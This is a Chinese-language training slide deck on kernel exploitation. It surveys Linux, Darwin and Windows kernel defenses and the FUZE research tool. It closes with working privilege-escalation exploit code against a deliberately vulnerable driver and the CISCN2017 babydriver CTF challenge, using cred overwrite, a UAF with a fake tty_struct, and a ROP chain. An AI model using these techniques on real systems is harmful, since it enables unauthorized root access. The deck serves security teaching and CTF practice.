title: A Guide To Kernel Exploit
transition: slide3
theme: dark
usemathjax: yes

[slide]

# A Guide To Kernel Exploit

[slide]

# A Guide To Kernel Exploit
---
- Linux
- Darwin
- Windows
- FUZE
- Sample

[slide]

# Linux Kernel

[slide]

# CVEs in Linux / 2007 - 2016
---
![CVEs](/img/linux-cve-1.png)

[slide]

# CVEs in Linux / 2007 - 2016
---
![CVE-distro](/img/vulns-distro.png)

[slide]

# Overview
---
- Linux介绍
    <!-- - 内核架构
    - 内存分配 -->
- 两种常用提权方式
- 内核漏洞利用
    <!-- - NULL pointer dereference
    - ret2usr(return to user)
    - ROP
    - ret2dir(return-to-direct-mapped memory)
    - 利用VDSO -->
- 内核保护措施
    <!-- - kptr_restrict
    - mmap_min_addr
    - SMEP/SMAP
    - KASLR
    - KPTI -->

[slide]

# Linux 简介

- linux内核在1991年首次被Linus发布
- Linux采用GPL(GNU General Public License)许可证开源
- Linux内核是单内核结构。不过，Linux也借鉴类微内核的优点：模块、抢占式内核、支持内核线程以及动态装载内核模块
- ring0用于内核代码和驱动程序，ring3用于用户程序。

[slide]

# 总体架构

![kernel-arch](/img/kernel-arch.jpg)

[slide]

# 系统调用流程

![system-call](/img/system-call.png)

[slide]

# 内核提权

- 用户态漏洞利用:`system("bin/sh")`
- 内核态漏洞利用:
    - 执行 `commit_creds(prepare_kernel_cred (0));`
    - 修改 `thread_info.task.cred`

[slide]

# 内核提权

```c
// linux/include/linux/cred.h
 struct cred {
......
    kuid_t      uid;        /* real UID of the task */
    kgid_t      gid;        /* real GID of the task */
    kuid_t      suid;       /* saved UID of the task */
    kgid_t      sgid;       /* saved GID of the task */
    kuid_t      euid;       /* effective UID of the task */
    kgid_t      egid;       /* effective GID of the task */
    kuid_t      fsuid;      /* UID for VFS ops */
    kgid_t      fsgid;      /* GID for VFS ops */
......
    struct user_struct *user;   /* real user ID subscription */
    struct user_namespace *user_ns; /*user_ns the caps and keyrings are relative to.*/
    struct group_info *group_info;  /* supplementary groups for euid/fsgid */
    struct rcu_head rcu;        /* RCU deletion hook */
} __randomize_layout;
```

[slide]

# 内核提权
---
可以直接使用 `commit_creds(prepare_kernel_cred (0));` 赋予当前进程root权限, 该调用分配并应用了一个新的root凭证给进程

<br/>

```
➜  ~ sudo grep -E "commit_creds|kernel_cred$" /proc/kallsyms 
ffffffff83ea7700 T commit_creds
ffffffff83ea7b70 T prepare_kernel_cred
......
```

[slide]

# 内核漏洞利用

- ROP
- VDSO
- NULL pointer dereference
- ret2usr (return to user)
- ret2dir (return-to-direct-mapped memory)

[slide]

# ROP

内核空间的ROP和用户空间的ROP利用方法差不多

```
|  padding             |<== low mem
|----------------------|
| pop rdi; ret         |
|----------------------|
| NULL                 |
|----------------------|
| addr of              |
| prepare_kernel_cred()|
|----------------------|
| pop rdx; ret         |
|----------------------|
| addr of              |
| commit_creds()       |
|----------------------|
| mov rdi, rax ;       |
| call rdx             |
|----------------------|
| swapgs;              |
| pop rbp; ret         |
|----------------------|
| 0xdeadbeef           |
| iretq;               |                |-----------------------|
|----------------------|                |void get_shell(void){  |
| addr of              |                |    system("/bin/sh"); |
| get_shell()          |--------------->|}                      |
|----------------------|                |-----------------------|
| CS                   |                
|----------------------|
| EFLAGS               |
|----------------------|
| RSP                  |
|----------------------|
| SS                   |
|----------------------|<== high mem
```

[slide]

# VDSO

为了减少内核与用户空间频繁切换，提高系统调用效率，vsyscall(virtual system call) 和d vdso(Virtual Dynamically-linked Shared Object) 被设计用来加速系统调用的处理。但由于vsyscall采用固定地址映射的方式，所以存在一定的安全隐患。而且vsyscall能支持的系统调用数有限，不利于扩展。

<br/>

vdso是vsyscall的主要替代方案，这是一个虚拟动态链接库，内核把那些系统调用放到这里面，然后用户程序在启动的时候通过动态链接操作，把这个vdso链到自己的内存空间中来。动态链接保证了vdso每次所在的地址都不一样，所以不太容易被利用，而且可以支持数量较多的系统调用。

[slide]

# VDSO

![VDSO](/img/vdso-1.png)

由于该段用户空间和内核空间是一一映射的， 如果能在这段空间中布置提权代码，可以让内核来执行该段代码，从而提权。 

[slide]

# NULL pointer dereference

```c
#include <stdio.h>

void (*foo)(void);

int main()
{
    int a = 0;
    printf("call foo\n");
    foo();
    return 0;
}
```

[slide]

# NULL pointer dereference

![null-pointer-1](/img/null-pointer-def-1.png)

[slide]

# NULL pointer dereference

![null-pointer-2](/img/null-pointer-def-2.png)


[slide]

# ret2usr

如果已经控制劫持流，那么可以跳到用户空间，执行提权代码

```
| padding              |<== low mem
|----------------------|
|   addr of            |              |--------------------------------------------|
|   get_root()         |------------->| void get_root()                            |
|                      |              | {                                          |
|----------------------|              |    char* (*pkc)(int) = prepare_kernel_cred;|
|  swapgs;             |              |    void (*cc)(char*) = commit_creds;       |
|  pop rbp; ret        |              |    (*cc)((*pkc)(0));                       |
|----------------------|              |    /* puts("[*] root now."); */            |
|  0xdeadbeef          |              | }                                          |
|  iretq;              |              |--------------------------------------------|
|                      |                |------------------------|
|----------------------|                | void get_shell(void){  |
| addr of              |                |     system("/bin/sh"); |
| get_shell()          |--------------->| }                      |
|----------------------|                |------------------------|
| CS                   |
|----------------------|
| EFLAGS               |
|----------------------|
| RSP                  |
|----------------------|
| SS                   |
|----------------------|<== high mem
```

[slide]

# ret2dir

Physmap是内核空间中的一大块连续内存区域，与RAM直接映射

![physmap-1](/img/physmap-1.png)

在用户空间写入数据，可以在physmap找到一个副本，直接调用physmap里面的shellcode，就不存在ret2usr的问题，可以绕过SMEP。

[slide]

# 内核保护措施
---
- kptr_restrict
- mmap_min_addr
- SMEP/SMAP
- KASLR
- KPTI

[slide]

# kptr_restrict

> 在linux内核漏洞利用中常常使用commit_creds和prepare_kernel_cred来完成提权，它们的地址可以从/proc/kallsyms中读取。从Ubuntu 11.04和RHEL 7开始，/proc/sys/kernel/kptr_restrict被默认设置为1以阻止通过这种方式泄露内核地址。

<br/>

```
➜  ~ sysctl kernel.kptr_restrict
kernel.kptr_restrict = 0
```

- 0: root和普通用户都可以读取
- 1: root用户有权限读取, 普通用户没有权限
- 2: 内核将符号地址打印为全0, root和普通用户都没有权限

[slide]

# mmap_min_addr

> 该选项指定进程可以mmap到的最低地址，消除了利用空指针执行shellcode提权的方法。

<br/>

```
➜  ~ sysctl vm.mmap_min_addr 
vm.mmap_min_addr = 65536
```

[slide]

# SMEP (Supervisor Mode Execution Protection)

- 作用: 是当CPU处于ring0模式时，执行用户空间的代码会触发页错误
- 原理: 系统根据CR4寄存器的值判断是否开启smep保护，当CR4寄存器的第20位是 1 时，保护开启
- 绕过: 
    - 内核ROP覆盖CR4寄存器,关闭SMEP
    - 直接内核ROP执行shellcode
    - ret2dir
    - 利用vdso绕过
    - ...


[slide]

## KPTI (Kernel PageTable Isolation)
---
用于缓解Spectre以及Meltdown漏洞。Meltdown漏洞利用内核地址空间和用户地址空间共用一个页全局目录表的特性。攻击者在非法访问内核地址和CPU处理异常的时间窗口，通过访存微指令获取内核数据。

<br/>

KPTI通过完全分离用户空间与内核空间页表来解决页表泄露。KPTI在2018年早期被合并到Linux内核4.15版，并被反向移植到Linux内核4.14等版本。

[slide]

# Darwin

[slide]

# Darwin内核的历史

[slide]

# Mac的前Darwin时代
-----
在Mac使用Darwin内核前，Mac采取的是协作式的多任务系统，即是进程需要主动放弃它的时间片才能将时间片交给其他进程。这样的系统是不完善，尽管如此这仍为之后打下基础(Finder的GUI，HFS对fork支持等)。

[slide]

# Darwin的起源
----
Darwin本质上是两种技术的结合，最底层实际上是Mach内核，CMU所编写的一个学术性质的微内核，被NeTX所收购，整合入NeXTSTEP中，最终苹果收购了NeTX，将NeTX的内核与之前的Mac相融合，构建了现在的Mac OS X。

[slide]

# Darwin内核的架构与特征

[slide]

![Darwin架构](/img/DarwinStructure.png)

---

[magic]

Darwin的架构如图，它包含了几个特征

=====

Darwin的是一个偏向微内核结构的内核。虽然微软宣称NT内核也是微内核架构，使用了handle，但是Darwin内核要远远的偏向微内核架构。

=====

由于其底层使用了Mach内核导致了Darwin内核天然的使用了消息机制，很多的调用都是消息的传递，NT内核则偏向宏内核。

=====

Darwin是两种内核的混合，BSD和Mach。Mach层提供最基本的抽象、调度和IPC以及虚拟内存管理。

=====

BSD则提供UNIX的支持，很多BSD的系统调用都将最终转换为对Mach端口的消息，BSD的主要职责之一就是“翻译”。

=====

微内核最致命的缺点就是消息传递过程中的消息复制，这造成了严重的性能损失。

=====

为了解决这个问题，Darwin实际上把微内核和其他内核组件均放入内核态，消息之间不在需要复制而只需要传递指针。

=====

Darwin内核中引入了IoKit组件，这个组件负责提供对驱动编写的有限的C++支持，也就是说Mac的驱动中存在一些C++中容易出现的漏洞。

=====

混合内核的特性导致Darwin存在两套系统调用，一套是Mach提供的，来一套是BSD提供的UNIX标准的。

=====

Darwin存在端口的概念，类似NT的handle但强大的多，Mach的消息传递机制本质上是RPC，理论上Darwin天然的支持分布式的系统。

======

Darwin内核开源，但只开源x86版本，不开源ARM版本，ARM版本用于iOS，两者间存在一些小的差异。

=====

Mach内核提供thread和task的概念，task是thread的容器。

=====

BSD层将UNIX thread和Mach Thread一一映射，将process同task一一映射，BSD层的这些操作最终会转化为Mach层的操作。

=====

Mach中实现了异步软件异常，这是一种特殊的消息，是UNIX信号机制的基础。

=====

Mach中存在续体，通过续体，在显式调度时不保存内核栈。这会对栈相关的漏洞造成影响。

======

Darwin中有多种换页机制，它们是模块化的，换页调度线程使用它们进行换页，这包括通常的换页以及内存加密的换页等。

======

Darwin支持内核扩展，但同时也存在kernelcache的机制，大多数内核扩展都集成在来kernelcache中并进行了预链接以加快内核启动速度。

[/magic]

[slide]

### Darwin的内存分配器
----
内存分配器对工作原理对漏洞利用至关重要，Darwin的内存分配器主要是zone alloc，这点同Linux类似，可以使用类似的方法进行堆风水。

[slide]

![Darwin内存分配器](/img/DarwinMemoryAlloc.png)

---

[magic]

上图是Darwin内核的内存分配器的架构图，有以下特点

=====

几乎所有的调用最终是调用zalloc，这是zone alloc的接口。

=====

zone alloc的原理是现声明被分配的对象大小，接着分配一片内存供之后使用，当缓冲区耗尽时，再申请额外的。

=====

在内核初始化时会初始化一系列大小(2的幂次)的zone供kalloc使用。

=====

kalloc是内核中最常用的分配器，可以分配任意大小内存，这实际上是将大小向上取2的幂次调用zalloc。

=====

如果申请的内存过大则直接调用kmem\_alloc\_\*。

=====

kmem_alloc_*和zalloc最终调用kernel_memory_allocate，它将调用cpm_allocate，这是一个硬件层的抽象。

=====

在进行堆风水的时候利用zalloc的特性，分配大量差不多大小的内存，迫使zone alloc分配新的内存，在新的内存中可以预测分配的顺序。

=====

早期提供zprint可以查看zone alloc的工作状况，更加方便堆布局，现在该命令已经需要root权限了。

[/magic]

[slide]

# Darwin特有的安全特性

[slide]

# root的权力
---
* 在Mac上，root的权力被严格的限制。

* root用户不能更改关键的系统路径，例如``/System``、``/bin``、``/usr``、``/sbin``

* root用户不能对系统进程进行任何操作和调试

* root用户不能更改系统程序

[slide]

# 强制代码签名
---
在iOS上，内核在装载时强制代码签名，这项机制尚未在Mac OS X上使用。具体来说，一块内存是否具有执行权限在装载时候已经决定，且之后不能更改，拥有执行权限的内存无法设置写权限且强制检查签名。

<br>

唯一的例外是Safari，它声明了特殊的键，可以创建具有写权限的可执行内存，其他的应用无法声明这个键。这为利用带来了一些麻烦。除了Safari，只能使用rop来达到利用的目的。

[slide]

# 沙盒
---
Darwin的沙盒同Android不同，其基于强制访问控制。应用只能使用受限的系统调用，即时是root，具有可使用哪些由应用的配置文件决定。iOS所有应用都强制采用沙盒，Mac OS X则宽松的多。

[slide]

![Darwin强制访问控制](/img/DarwinMAC.png)

在内核中分布了大量的检查点检查进程是否符合强控策略，检查失败则直接返回。这对内核漏洞利用用造成了巨大的影响，这导致实际上能够使用的系统调用极其有限。

[slide]

# 可信引导
---

iOS采用了可信引导，这导致了如果没有bootloader级的漏洞，无法对内核进行持久化的patch，而一个没有被patch的Darwin内核即使是root权限，能做的事情也是十分有限的。

![Darwin引导](/img/DarwinBoot.png)

[slide]

# iOS的限制
---
* Darwin在iOS上设置了更多的限制：

* 内核和内核模块均加密，需要采用芯片固件的密钥进行解密，而这个固件无法提取，需要采用引导阶段的漏洞泄露密钥

* 无法通过 ``task_for_pid(0)`` 获得对内核线程的控制

* 不开源，无符号表

[slide]

# Darwin内核利用步骤
---
* 在有沙箱的状况下造成内核代码执行。

* 修复内核状态，提升权限(如root)

* 对内核进行patch，例如关闭代码签名检查，关闭强制访问控制，允许执行task_for_pid(0)等

[slide]

# Windows

[slide]

# Windows NT
---

NT 版本 | 发行名
:-------|:------
3.1 | Windows NT 3.1
4.0 | Windows NT 4.0
5.0 | Windows 2000
5.1 | Windows XP
6.0 | Windows Vista / Windows Server 2008
6.1 | Windows 7
6.2 | Windows 8
10.0 | Windows 10

[slide]

# 安全机制

[slide]

## Windows 9x
---
- Nothing

[slide]
## Windows NT
---
- 身份认证
- 访问控制
- 安全审计
- ...

[slide]

## Windows 2000
---
- Kerberos
- 活动目录
- 组策略
- ...

[slide]

## Windows XP SP2
---
- DEP
- 防火墙
- 安全中心
- ...

[slide]

## Windows Vista
---
- ASLR
- PatchGuard
- Code Signing
- UAC (User Account Control)
- WFP (Windows File Protection)
- WRP (Windows Resource Protection)
- UIPI (User Interface Privilege Isolation)
- ...

[slide]

## Windows 8
---
- 内核和硬件加固

[slide]

## Windows 10
---
- CFG (Control Flow Guard)
- 内核加固
- 应用加固

[slide]

## DEP - CPU Support
---
- AMD: EVP (Enhanced Virus Protection)
- Intel: EDB (Execute Disable Bit)

[slide]

## DEP - Configuration
---
- Optin
    - 基础的Windows程序和服务启用
- Optout
    - 部分程序不启动
- AlwaysOn
    - 持续启动，无法关闭
- AlwaysOff
    - 禁止启用

[slide]

## ASLR
---
- 模块随机化
- 堆栈随机化
- PEB / TEB 随机化

[slide]

## PatchGuard
---
- SSDT (System Service Descriptor Table)
- GDT (Global Descriptor Table)
- IDT (Interrupt Descriptor Table)
- System images (ntoskrnl.exe, ndis.sys, hal.dll)
- ...

[slide]

## Code Signing
---
- 检查驱动完整性
- 检查驱动 / 系统文件签名

[slide]

# FUZE

[slide]

# UAF
---
UAF是一种常见的漏洞，在内核中也非常常见。内核由于大量的使用了函数指针，这导致UAF常常可以造成控制流的劫持。造成UAF的原因是一个对象在被释放后仍然被使用。

[slide]

## 内核UAF利用的一般步骤
---
1. 触发漏洞，造成对象被释放形成野指针，现在对象已经被释放，二其他部分代码则认为对象仍然是可用的。

2. 使用一个系统调用，进行堆喷射，使用攻击者控制的数据填充对象

3. 使用另一个系统调用对对象解引用，最理想的情况是控制指令寄存器

[slide]

# FUZE
---
FUZE的目的是确定一个UAF漏洞可利用性，它的目的不是完全的漏洞利用自动化，而是辅助漏洞利用。

<br>

FUZE的关键是第二个步骤，他主要目的是寻找一个适合的系统调用能够有效的进行堆喷射，并最终到达一个容易利用的状态，比如控制指令寄存器。

<br>

FUZE需要输入漏洞的PoC，以PoC为基础，试图寻找有效的利用。

[slide]

# FUZE Method

1. 提取关键信息。利用KASAN，可用获得漏洞对象的相关信息、漏洞对象被释放后的程序状态等信息

2. 内核Fuzz。利用之前获得的信息，初始化内核状态到第二步，同时hook住第三步的系统调用，确保内核不会panic。利用分支覆盖通过系统调用进行fuzz。

3. 符号执行。针对能够覆盖漏洞变量的case，进行带约束的符号执行。约束为case执行后的状态。通过符号执行，可用知道接下来这样的状态是否易造成利用。这样做的好处有两点：1.不会造成内核panic 2.可用尝试使用其他的系统调用进行解引用。

[slide]

# Exploit Sample

[slide]

# 环境准备

[slide]

# 编译
---
- Enable KGDB
- Disable Module Signature
- 静态编译 Busybox

[slide]

```c
long arw_ioctl(struct file *filp, unsigned int cmd, unsigned long arg)
{
    struct ioctl_param  par;
    struct ioctl_param* parg;
    int retval;
    retval = 0;
    parg = (struct ioctl_param*)arg;
    
    switch (cmd) {
        case READ_HANDLER:
            put_user(&retval, &parg->addr);
            break;
        case WRITE_HANDLER:
            copy_from_user(&par, parg, sizeof(struct ioctl_param));
            memset(par.addr, (int)par.buf, par.len);
            break;
        default:
            retval = -1;
            break;
    }

    return retval;
}
```

[slide]

# Step 1 - 泄漏地址

```c
// leak stack addr
ioctl(fd, READ_HANDLER, &param);
printf("[*] stack's address: %p\n", param.addr);

thread_info = (void *)((long) param.addr & CURRENT_MASK);
printf("[*] thread_info's address: %p\n", thread_info);
addr_limit = thread_info + ADDR_LIMIT_OFFSET;
printf("[*] addr_limit's  address: %p\n", addr_limit);
```

[slide]

# Step 2 - 修改addr limit

```c
// set addr limit to 0xffffffffffffffff
param.len  = PTR_LEN;
param.buf  = (char) 0xff;
param.addr = addr_limit;
ioctl(fd, WRITE_HANDLER, &param);
```

[slide]

# Step 3 - 读cred地址

```c
kmemcpy(&task_addr, thread_info, PTR_LEN);
printf("[*] task_struct's address: %p\n", task_addr);

kmemcpy(&real_cred, task_addr + REAL_CRED_OFFSET, PTR_LEN);
printf("[*] task_struct->real_cred's address: %p\n", real_cred);

cred = real_cred + sizeof(void *);
printf("[*] task_struct->cred's address: %p\n", cred);
```

[slide]

# Step 4 - cred置0

```c
cred_ids = malloc(CRED_LEN);
memset(cred_ids, 0, CRED_LEN);
// modify task->cred
kmemcpy(cred + UID_OFFSET, cred_ids, CRED_LEN);
// modify task->real_cred
kmemcpy(real_cred + UID_OFFSET, cred_ids, CRED_LEN);
printf("[*] getuid() = %d, getgid() = %d\n", getuid(), getgid());
```

[slide]

# Step 5 - Get Shell

```c
system("/bin/sh");
```

[slide]

# CISCN2017 - Babydriver

[slide]

## ioctl
---

```c
// local variable allocation has failed, the output may be wrong!
void __fastcall babyioctl(file *filp, unsigned int command, unsigned __int64 arg)
{
  size_t v3; // rdx
  size_t v4; // rbx
  __int64 v5; // rdx

  _fentry__(filp, *(_QWORD *)&command);
  v4 = v3;
  if ( command == 0x10001 )
  {
    kfree(babydev_struct.device_buf);
    babydev_struct.device_buf = (char *)_kmalloc(v4, 0x24000C0LL);
    babydev_struct.device_buf_len = v4;
    printk("alloc done\n", 0x24000C0LL, v5);
  }
  else
  {
    printk("\x013defalut:arg is %ld\n", v3, v3);
  }
}
```

[slide]

## open
---

```c
int __fastcall babyopen(inode *inode, file *filp)
{
  __int64 v2; // rdx

  _fentry__(inode, filp);
  babydev_struct.device_buf = (char *)kmem_cache_alloc_trace(kmalloc_caches[6], 0x24000C0LL, 0x40LL);
  babydev_struct.device_buf_len = 64LL;
  printk("device open\n", 0x24000C0LL, v2);
  return 0;
}
```

[slide]

## read
---
```c
void __fastcall babyread(file *filp, char *buffer, size_t length, loff_t *offset)
{
  size_t v4; // rdx

  _fentry__(filp, buffer);
  if ( babydev_struct.device_buf )
  {
    if ( babydev_struct.device_buf_len > v4 )
      copy_to_user(buffer, babydev_struct.device_buf, v4);
  }
}
```

[slide]

## write
---
```c
void __fastcall babywrite(file *filp, const char *buffer, size_t length, loff_t *offset)
{
  size_t v4; // rdx

  _fentry__(filp, buffer);
  if ( babydev_struct.device_buf )
  {
    if ( babydev_struct.device_buf_len > v4 )
      copy_from_user(babydev_struct.device_buf, buffer, v4);
  }
}
```

[slide]

# UAF Change Cred

```c
int fd1 = open("/dev/babydev", O_RDWR);
int fd2 = open("/dev/babydev", O_RDWR);

// 修改 babydev_struct.device_buf_len 为 sizeof(struct cred)
ioctl(fd1, 0x10001, 0x8a);
close(fd1);

// 新起进程的 cred 空间会和刚刚释放的 babydev_struct 重叠
if(fork() == 0) {

    char zeros[30] = {0};
    write(fd2, zeros, 28);

    if(getuid() == 0)
    {
        system("/bin/sh");
        exit(0);
    }
}
```

[slide]

# UAF With tty_struct

```c
int fd1 = open("/dev/babydev", O_RDWR);
int fd2 = open("/dev/babydev", O_RDWR);
ioctl(fd1, 0x10001, 0x2e0);
close(fd1);

int fd_tty = open("/dev/ptmx", O_RDWR|O_NOCTTY);
size_t fake_tty_struct[4] = {0};
read(fd2, fake_tty_struct, 32);
fake_tty_struct[3] = (size_t)fake_tty_operations;
write(fd2,fake_tty_struct, 32);

char buf[0x8] = {0};
write(fd_tty, buf, 8);
```

[slide]

# UAF With ROP

```c
rop[i++] = 0xffffffff810d238d;
rop[i++] = 0x6f0;
rop[i++] = 0xffffffff81004d80;
rop[i++] = 0;
rop[i++] = (size_t)get_root;
rop[i++] = 0xffffffff81063694;
rop[i++] = 0;
rop[i++] = 0xffffffff814e35ef;
rop[i++] = (size_t)get_shell;
rop[i++] = user_cs;
rop[i++] = user_rflags;
rop[i++] = user_sp;
rop[i++] = user_ss;

for(int i = 0; i < 30; i++)
{
    fake_tty_operations[i] = 0xFFFFFFFF8181BFC5; 
}
fake_tty_operations[0] = 0xffffffff810635f5;
fake_tty_operations[1] = (size_t)rop;
fake_tty_operations[3] = 0xFFFFFFFF8181BFC5;
```
